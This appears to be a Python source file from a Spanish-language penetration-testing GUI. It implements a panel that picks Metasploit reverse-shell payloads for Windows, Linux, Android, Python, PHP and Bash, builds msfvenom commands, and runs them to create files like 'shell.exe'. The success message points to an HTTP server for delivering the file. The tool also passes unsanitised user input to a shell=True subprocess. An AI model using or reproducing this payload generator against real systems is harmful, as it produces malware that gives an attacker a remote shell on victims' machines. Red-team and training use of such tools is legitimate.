import os
import platform
import subprocess
import threading

import customtkinter as ctk

from ..ui_constants import UI_FONT, UI_FONT_BOLD, MONO_FONT
from ..services import build_msfvenom_cmd


class PayloadsPanel(ctk.CTkFrame):
    PAYLOADS_DB = {
        "Windows (.exe)":   {"p": "windows/meterpreter/reverse_tcp", "f": "exe", "ext": "exe"},
        "Linux (.elf)":     {"p": "linux/x64/shell_reverse_tcp",     "f": "elf", "ext": "elf"},
        "Android (.apk)":   {"p": "android/meterpreter/reverse_tcp", "f": "raw", "ext": "apk"},
        "Python (.py)":     {"p": "python/meterpreter/reverse_tcp",  "f": "raw", "ext": "py"},
        "Web PHP (.php)":   {"p": "php/meterpreter_reverse_tcp",     "f": "raw", "ext": "php"},
        "Bash (.sh)":       {"p": "cmd/unix/reverse_bash",           "f": "raw", "ext": "sh"}
    }

    def __init__(self, app):
        super().__init__(app.content, fg_color=app.c["BG_MAIN"])
        self.app = app
        self.build()

    def build(self):
        c = self.app.c
        header = ctk.CTkFrame(self, fg_color=c["BG_CARD"])
        header.pack(fill="x", pady=8)
        ctk.CTkLabel(header, text="Generador de Payloads (msfvenom)", font=("Poppins", 18, "bold"), text_color=c["TEXT_PRIMARY"]).pack(side="left", padx=16, pady=14)

        form = ctk.CTkFrame(self, fg_color=c["BG_PANEL"])
        form.pack(fill="x", padx=14, pady=10)

        ctk.CTkLabel(form, text="Sistema Objetivo:", font=UI_FONT, text_color=c["TEXT_PRIMARY"]).grid(row=0, column=0, padx=12, pady=10, sticky="e")
        self.payload_os_menu = ctk.CTkOptionMenu(form, values=list(self.PAYLOADS_DB.keys()),
                                                 fg_color=c["BG_CARD"], button_color=c["ACCENT"], button_hover_color=c["ACCENT_HOVER"],
                                                 dropdown_fg_color=c["BG_CARD"], dropdown_text_color=c["TEXT_PRIMARY"],
                                                 text_color=c["TEXT_PRIMARY"], font=UI_FONT)
        self.payload_os_menu.grid(row=0, column=1, padx=12, pady=10, sticky="w")

        ctk.CTkLabel(form, text="LHOST (Tu IP):", font=UI_FONT, text_color=c["TEXT_PRIMARY"]).grid(row=1, column=0, padx=12, pady=10, sticky="e")
        self.payload_lhost = ctk.CTkEntry(form, width=190,
                                          fg_color=c["BG_CARD"], border_color=c["ACCENT_SECONDARY"], border_width=1,
                                          corner_radius=10, text_color=c["TEXT_PRIMARY"], font=UI_FONT)
        self.payload_lhost.insert(0, self.app.obtener_ip_local())
        self.payload_lhost.grid(row=1, column=1, padx=12, pady=10, sticky="w")

        ctk.CTkLabel(form, text="LPORT:", font=UI_FONT, text_color=c["TEXT_PRIMARY"]).grid(row=2, column=0, padx=12, pady=10, sticky="e")
        self.payload_lport = ctk.CTkEntry(form, width=190,
                                          fg_color=c["BG_CARD"], border_color=c["ACCENT_SECONDARY"], border_width=1,
                                          corner_radius=10, text_color=c["TEXT_PRIMARY"], font=UI_FONT)
        self.payload_lport.insert(0, "4444")
        self.payload_lport.grid(row=2, column=1, padx=12, pady=10, sticky="w")

        ctk.CTkLabel(form, text="Nombre de salida:", font=UI_FONT, text_color=c["TEXT_PRIMARY"]).grid(row=3, column=0, padx=12, pady=10, sticky="e")
        self.payload_filename = ctk.CTkEntry(form, width=190,
                                             fg_color=c["BG_CARD"], border_color=c["ACCENT_SECONDARY"], border_width=1,
                                             corner_radius=10, text_color=c["TEXT_PRIMARY"], font=UI_FONT)
        self.payload_filename.insert(0, "shell")
        self.payload_filename.grid(row=3, column=1, padx=12, pady=10, sticky="w")

        self.btn_gen_payload = ctk.CTkButton(self, text="Generar Payload", fg_color=c["ACCENT"], hover_color=c["ACCENT_HOVER"],
                                             corner_radius=12, font=UI_FONT_BOLD, command=self.generar_payload, height=44)
        self.btn_gen_payload.pack(fill="x", padx=14, pady=14)

        self.payload_output = ctk.CTkTextbox(self, height=260, font=MONO_FONT,
                                             fg_color=c["BG_CARD"], text_color=c["TEXT_PRIMARY"])
        self.payload_output.pack(fill="both", expand=True, padx=14, pady=(0, 14))

    def generar_payload(self):
        seleccion = self.payload_os_menu.get()
        lhost = self.payload_lhost.get().strip()
        lport = self.payload_lport.get().strip()
        nombre_base = self.payload_filename.get().strip()
        
        # Validar entrada
        if not seleccion:
            self._show_payload_error("Error: Selecciona un sistema objetivo")
            return
        if not lhost:
            self._show_payload_error("Error: Ingresa LHOST (tu IP)")
            return
        if not lport:
            self._show_payload_error("Error: Ingresa LPORT")
            return
        if not nombre_base:
            self._show_payload_error("Error: Ingresa nombre de archivo")
            return
        
        # Validar puerto
        try:
            port_num = int(lport)
            if port_num < 1 or port_num > 65535:
                self._show_payload_error("Error: Puerto fuera de rango (1-65535)")
                return
        except ValueError:
            self._show_payload_error("Error: Puerto debe ser un número")
            return
        
        datos = self.PAYLOADS_DB[seleccion]
        payload_code = datos["p"]
        file_format = datos["f"]
        extension = datos["ext"]
        full_filename = f"{nombre_base}.{extension}"
        cmd = build_msfvenom_cmd(payload_code, lhost, lport, file_format, full_filename)
        
        self.payload_output.delete("1.0", "end")
        self.payload_output.insert("end", f"🚀 Generador de Payload - msfvenom\n")
        self.payload_output.insert("end", f"────────────────────────────────────\n\n")
        self.payload_output.insert("end", f"  Sistema: {seleccion}\n")
        self.payload_output.insert("end", f"  LHOST: {lhost}\n")
        self.payload_output.insert("end", f"  LPORT: {lport}\n")
        self.payload_output.insert("end", f"  Archivo: {full_filename}\n\n")
        
        sistema = platform.system()
        if self.app.logger:
            self.app.logger.payloads(f"🚀 Generando payload {full_filename} ({seleccion})")
        
        if sistema == "Windows":
            self.payload_output.insert("end", f"[ℹ️] Estás en Windows. Copia y pega en tu Kali:\n\n")
            self.payload_output.insert("end", f"{cmd}\n\n")
            self.payload_output.insert("end", f"[ℹ️] Comando copiado. Úsalo en Kali Linux.\n")
        else:
            self.payload_output.insert("end", f"⏳ Ejecutando msfvenom...\n\n")
            self.payload_output.insert("end", f"Comando: {cmd}\n\n")

            def run_msf():
                try:
                    process = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    if process.returncode == 0:
                        self.after(0, lambda: self.log_payload_success(full_filename))
                    else:
                        self.after(0, lambda: self.log_payload_error(process.stderr))
                except Exception as e:
                    self.after(0, lambda: self.log_payload_error(str(e)))

            threading.Thread(target=run_msf, daemon=True).start()

    def log_payload_success(self, filename):
        self.payload_output.insert("end", f"[+] Éxito: {filename} creado en {os.getcwd()}\n")
        self.payload_output.insert("end", "[*] Usa el servidor HTTP para entregarlo.\n")
        if self.app.logger:
            self.app.logger.payloads(f"Payload creado: {filename}")

    def _show_payload_error(self, err):
        """Mostrar error en el output"""
        self.payload_output.delete("1.0", "end")
        self.payload_output.insert("end", f"[❌] {err}\n")
        if self.app.logger:
            self.app.logger.error(f"Error: {err}", tag="PAYLOADS")

    def log_payload_error(self, err):
        self.payload_output.insert("end", f"[❌] Error: {err}\n¿msfvenom está en el PATH?")
        if self.app.logger:
            self.app.logger.error(f"Error generando payload: {err}", tag="PAYLOADS")
